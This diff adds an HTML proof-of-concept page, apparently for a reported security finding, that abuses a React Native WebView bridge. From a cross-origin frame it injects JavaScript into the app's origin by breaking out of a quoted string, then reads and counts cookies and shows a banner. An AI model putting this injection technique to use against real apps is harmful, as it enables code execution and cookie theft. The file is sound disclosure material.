@@ -1,0 +1,64 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>H-1 cross-origin PoC frame</title>
+<style>body{font:13px/1.5 sans-serif;background:#222;color:#fff;margin:0;padding:12px}
+b{color:#ff6b6b}</style></head>
+<body>
+<b>attacker-controlled frame</b><br>
+origin: <span id="o"></span><br>
+<span id="s">checking native bridge...</span>
+
+<script>
+(function () {
+  var origin = location.origin;
+  var bridge = (typeof window.ReactNativeWebView);
+  var post   = 'n/a';
+  try { post = typeof window.ReactNativeWebView.postMessage; } catch (e) { post = 'throw'; }
+
+  document.getElementById('o').textContent = origin;
+  document.getElementById('s').textContent =
+      'window.ReactNativeWebView = ' + bridge + '   postMessage = ' + post;
+
+  // Report upward with ordinary window.postMessage. This works cross-origin
+  // and does not depend on the native bridge, so the negative result is
+  // observable too.
+  function tell(stage, extra) {
+    try {
+      parent.postMessage({ xo: true, stage: stage, origin: origin,
+                           bridge: bridge, post: post, extra: extra || null }, '*');
+    } catch (e) {}
+  }
+
+  tell('loaded');
+  if (bridge !== 'object' || post !== 'function') { return; }
+
+  // Payload constraints: this string is serialised with JSON.stringify by the
+  // app before it lands in JavaScript source position, and JSON.stringify
+  // escapes the double quote to \" which is a syntax error once it is code.
+  // So: single quotes only, no backslashes, no newlines.
+  var payload = [
+    "xo');",
+    "(function(){",
+    "var o=location.origin;",
+    "var c=document.cookie||'';",
+    "var n=c?c.split('; ').length:0;",
+    "var d=document.createElement('div');",
+    "d.style.cssText='position:fixed;top:0;left:0;right:0;z-index:2147483647;",
+    "background:#b00020;color:#fff;font:13px/1.4 sans-serif;padding:12px;text-align:center';",
+    "d.textContent='H-1 PoC - code delivered by ", origin,
+    " is executing in '+o+'  |  cookies readable here: '+n+'  |  '+new Date().toISOString();",
+    "document.body.insertAdjacentElement('afterbegin',d);",
+    "window.__xo_rec && window.__xo_rec('PROOF',{executing_in:o,",
+    "delivered_by:'", origin, "',cookie_count:n,cookie_chars:c.length});",
+    "})();",
+    "//"
+  ].join('');
+
+  setTimeout(function () {
+    try {
+      window.ReactNativeWebView.postMessage(JSON.stringify({ id: 'xo-1', method: payload }));
+      tell('posted');
+    } catch (e) { tell('post-failed', '' + e); }
+  }, 1200);
+})();
+</script>
+</body></html>
